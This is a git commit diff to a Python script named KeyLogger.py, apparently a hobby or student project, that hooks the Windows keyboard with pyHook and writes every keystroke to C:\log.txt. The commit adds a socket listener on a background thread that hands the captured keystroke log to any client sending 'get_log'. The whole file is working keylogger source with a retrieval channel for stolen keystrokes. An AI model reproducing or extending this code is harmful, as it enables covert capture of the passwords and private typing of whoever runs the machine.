2da3d9727d1bb0e7a4873a0aa285f8d554798c54
packers540 <nsypo001@odu.edu>
2015-11-04 19:12:22 -0500

    Added Networking

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,4 +1,4 @@
-import pyHook, pythoncom, sys, logging
+import pyHook, pythoncom, sys, logging, socket, thread, pickle
 
 key_log = 'C:\\log.txt'
 
@@ -8,7 +8,24 @@ def KeyEvent(event):
     logging.log(10, chr(event.Ascii))
     return True
 
+def sendLog():
+    while True:
+        s = socket.socket()
+        s.bind(('127.0.0.1', 12345))
+        s.listen(1)
+        conn, addr = s.accept()
+        if (conn.recv(1024) == "get_log"):
+            logFile = open(key_log, 'r')
+            conn.send(pickle.dumps(logFile, -1))
+            print "sent log to ", addr
+        conn.close()
+        s.close()
+        
+
+thread.start_new_thread(sendLog, ())
+
 hook = pyHook.HookManager()
 hook.KeyDown = KeyEvent
 hook.HookKeyboard()
 pythoncom.PumpMessages()
+
